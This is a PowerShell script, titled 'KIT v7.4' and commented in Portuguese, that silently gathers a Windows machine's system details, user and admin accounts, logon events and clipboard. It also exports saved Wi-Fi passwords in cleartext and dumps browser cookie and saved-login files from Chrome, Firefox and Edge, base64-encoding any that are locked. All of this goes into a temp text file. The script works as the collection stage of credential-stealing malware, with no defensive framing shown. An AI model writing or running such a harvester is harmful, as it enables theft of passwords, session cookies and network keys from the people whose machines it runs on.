# KIT v7.4  –  TXT 100% legível, sem erros de path
$ErrorActionPreference = 'SilentlyContinue'
$out = "$env:TEMP\kit_$(Get-Random).txt"
'' | Set-Content $out -Encoding UTF8
function OutKit{ param($t)  Add-Content $out $t -Encoding UTF8 }

# ---------- 1) Sistema ----------
OutKit '=== SYSTEMINFO ==='
OutKit (systeminfo)
OutKit "`n=== ComputerSystem ==="
OutKit (Get-CimInstance Win32_ComputerSystem | ConvertTo-Json -Compress)
OutKit "`n=== Processor ==="
OutKit (Get-CimInstance Win32_Processor | ConvertTo-Json -Compress)
OutKit "`n=== BIOS ==="
OutKit (Get-CimInstance Win32_BIOS | ConvertTo-Json -Compress)
OutKit "`n=== NetIP ==="
OutKit (Get-NetIPConfiguration | ConvertTo-Json -Compress)
OutKit "`n=== Users ==="
OutKit (Get-CimInstance Win32_UserAccount | ConvertTo-Json -Compress)
OutKit "`n=== Admins ==="
OutKit (net localgroup administradores)
OutKit "`n=== Logons 4624 ==="
OutKit ( (Get-WinEvent @{LogName='Security';ID=4624;Max=100}) |
            Select TimeCreated,ID,Message | ConvertTo-Json -Compress )
OutKit "`n=== Clipboard ==="
OutKit (Get-Clipboard -Raw)

# ---------- 2) Recent ----------
OutKit "`n=== Recent Files ==="
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File |
    Select Name,LastWriteTime,Length | ConvertTo-Json -Compress | %{ OutKit $_ }

# ---------- 3) Certs ----------
OutKit "`n=== Certs ==="
Get-ChildItem Cert:\CurrentUser\My |
    Select Subject,Thumbprint,NotAfter | ConvertTo-Json -Compress | %{ OutKit $_ }

# ---------- 4) Wi-Fi – XML em folder próprio ----------
$wifiDir = "$env:TEMP\wifi_$(Get-Random)"
New-Item $wifiDir -ItemType Directory -Force | Out-Null
Push-Location $wifiDir
netsh wlan export profile key=clear | Out-Null
Get-ChildItem $wifiDir -Filter *.xml | %{
    OutKit "`n=== Wi-Fi: $($_.Name) ==="
    OutKit (Get-Content $_ -Raw)
}
Pop-Location
Remove-Item $wifiDir -Recurse -Force

# ---------- 5) Navegadores – só texto/base64 ----------
@(
    @{P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default";F=@('Cookies','Login Data','History')},
    @{P="$env:APPDATA\Mozilla\Firefox\Profiles";F=@('cookies.sqlite','logins.json','places.sqlite')},
    @{P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default";F=@('Cookies','Login Data','History')}
) | %{
    $base = $_.P
    $_.F | %{
        $file = Get-ChildItem $base -Recurse -File -Name $_ | Select -First 1
        if($file){
            $full = Join-Path $base $file
            OutKit "`n=== Browser: $full ==="
            try{
                if($full -match '\.(sqlite|db)$'){
                    Add-Type -Path "$env:PROGRAMFILES\System.Data.SQLite\System.Data.SQLite.dll" -EA Stop
                    $cnn = New-Object Data.SQLite.SQLiteConnection "Data Source=$full;Read Only=True;Mode=ReadOnly"
                    $cnn.Open()
                    $da = New-Object Data.SQLite.SQLiteDataAdapter "SELECT host,name,value FROM cookies LIMIT 50",$cnn
                    $tbl = New-Object System.Data.DataTable;  [void]$da.Fill($tbl)
                    $cnn.Close()
                    OutKit ($tbl | ConvertTo-Json -Compress)
                }else{
                    OutKit (Get-Content $full -Raw)
                }
            }catch{
                OutKit '# locked – base64 #'
                OutKit ([Convert]::ToBase64String([IO.File]::ReadAllBytes($full)))
            }
        }
    }
}

# ---------- 6) Fim ----------
Write-Host "`nKit salvo em:  $out" -Fore Green
Invoke-Item $out
